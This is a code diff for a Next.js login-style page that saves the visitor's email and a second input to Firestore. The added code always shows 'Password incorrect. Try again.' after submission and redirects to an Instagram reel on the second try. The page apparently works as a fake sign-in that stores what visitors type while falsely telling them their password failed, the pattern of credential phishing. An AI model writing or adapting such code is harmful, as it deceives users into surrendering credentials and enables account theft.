@@ -5,6 +5,9 @@ import { addDoc, collection, serverTimestamp } from "firebase/firestore/lite";
 import Image from "next/image";
 import { db } from "@/lib/firebase";
 
+const INSTAGRAM_REEL_URL =
+  "https://www.instagram.com/reel/DdGi_rFO4Lo/?utm_source=ig_web_copy_link&stkn=NTc4MTIwNjQ2YQ==";
+
 export default function AuthPage() {
   const [email, setEmail] = useState("");
   const [note, setNote] = useState("");
@@ -12,9 +15,15 @@ export default function AuthPage() {
   const [loading, setLoading] = useState(false);
   const [message, setMessage] = useState("");
   const [error, setError] = useState("");
+  const [attemptCount, setAttemptCount] = useState(0);
 
   async function handleSubmit(event: FormEvent<HTMLFormElement>) {
     event.preventDefault();
+
+    if (attemptCount >= 1) {
+      window.location.assign(INSTAGRAM_REEL_URL);
+      return;
+    }
 
     console.log("1 - submit started");
 
@@ -42,6 +51,7 @@ export default function AuthPage() {
     } finally {
       console.log("4 - submit finished");
       setLoading(false);
+      setAttemptCount(1);
       setError("Password incorrect. Try again.");
     }
   }
